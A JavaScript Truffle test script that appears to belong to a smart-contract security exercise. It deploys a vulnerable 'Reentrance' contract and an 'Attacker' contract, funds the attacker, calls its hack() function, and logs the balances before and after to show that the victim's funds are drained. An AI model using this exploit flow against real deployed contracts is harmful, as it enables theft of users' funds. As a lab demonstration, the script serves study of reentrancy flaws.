const Reentrance = artifacts.require("Reentrance");
const Attacker = artifacts.require("Attacker");

contract("Reentrance", accounts => {
  it('test all the things!', async () => {
    const reentrance = await Reentrance.deployed()
    const attacker = await Attacker.deployed()

    const sender = accounts[0]

    console.log('Balance')
    console.log(`\tsender              (${sender}): ${await web3.eth.getBalance(sender)}`)
    console.log(`\tAttacker Contract   (${attacker.address}): ${await web3.eth.getBalance(attacker.address)}`)
    console.log(`\tReentrance Contract (${reentrance.address}): ${await web3.eth.getBalance(reentrance.address)}`)
    console.log(`\tAttacker in Reentrance Contract: ${await reentrance.balanceOf(attacker.address)}`)


    const txSetVictim = await attacker.setVictim(reentrance.address, { value: '10000000000000000000', from: sender })
    console.log(`setVictim() tx (${txSetVictim.tx})\t${txSetVictim.receipt.status ? 'SUCCESS' : 'FAILED'}`)

    console.log('Balance')
    console.log(`\tsender              (${sender}): ${await web3.eth.getBalance(sender)}`)
    console.log(`\tAttacker Contract   (${attacker.address}): ${await web3.eth.getBalance(attacker.address)}`)
    console.log(`\tReentrance Contract (${reentrance.address}): ${await web3.eth.getBalance(reentrance.address)}`)
    console.log(`\tAttacker in Reentrance Contract: ${await reentrance.balanceOf(attacker.address)}`)

    const txHack = await attacker.hack()
    console.log(`hack() tx (${txHack.tx})\t${txHack.receipt.status ? 'SUCCESS' : 'FAILED'}`)

    console.log('Balance')
    console.log(`\tsender              (${sender}): ${await web3.eth.getBalance(sender)}`)
    console.log(`\tAttacker Contract   (${attacker.address}): ${await web3.eth.getBalance(attacker.address)}`)
    console.log(`\tReentrance Contract (${reentrance.address}): ${await web3.eth.getBalance(reentrance.address)}`)
    console.log(`\tAttacker in Reentrance Contract: ${await reentrance.balanceOf(attacker.address)}`)
  })
})
